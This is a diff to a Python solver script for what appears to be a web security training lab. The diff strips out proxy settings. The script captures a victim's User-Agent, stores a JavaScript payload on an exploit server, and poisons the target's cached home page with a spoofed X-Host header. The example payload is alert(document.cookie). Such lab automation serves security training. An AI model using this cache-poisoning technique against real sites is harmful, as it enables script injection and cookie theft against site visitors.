@@ -13,11 +13,11 @@ class LabSolver:
         self.user_agent = None
 
     def get_csrf_token(self, endpoint):
-        response = self.session.get(self.lab_url + endpoint, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url + endpoint)
         return re.search('name="csrf" value="(.*)"', response.text).group(1)
 
     def get_exploit_server_url(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)
 
     def post_malicious_comment(self):
@@ -29,10 +29,10 @@ class LabSolver:
             'email': 'hello@hello.com',
             'website': 'https://hello.com'
         }
-        self.session.post(self.lab_url + 'post/comment', data=data, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        self.session.post(self.lab_url + 'post/comment', data=data)
 
     def get_victim_user_agent(self):
-        response = self.session.get(self.exploit_server_url + '/log', proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.exploit_server_url + '/log')
         self.user_agent = re.findall(r'user-agent: (.*)&', response.text)[-1]
 
     def store_payload_on_exploit_server(self):
@@ -43,22 +43,22 @@ class LabSolver:
             'responseBody': 'alert(document.cookie)',
             'formAction': 'STORE'
         }
-        self.session.post(self.exploit_server_url, data=data, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        self.session.post(self.exploit_server_url, data=data)
 
     def poison_home_page(self):
         headers = {
             'X-Host': self.exploit_server_url.replace('https://', ''),
             'User-Agent': self.user_agent
         }
-        response = self.session.get(self.lab_url, headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url, headers=headers)
         while True:
             if (self.exploit_server_url.replace('https://', '') + '/resources/js/tracking.js') not in response.text:
-                response = self.session.get(self.lab_url, headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+                response = self.session.get(self.lab_url, headers=headers)
             else:
                 break
 
     def check_solution(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         if 'Congratulations, you solved the lab!' in response.text:
             print('You solved the lab.')
             print('Coded by Mohamed Ahmed (ma4747gh).')
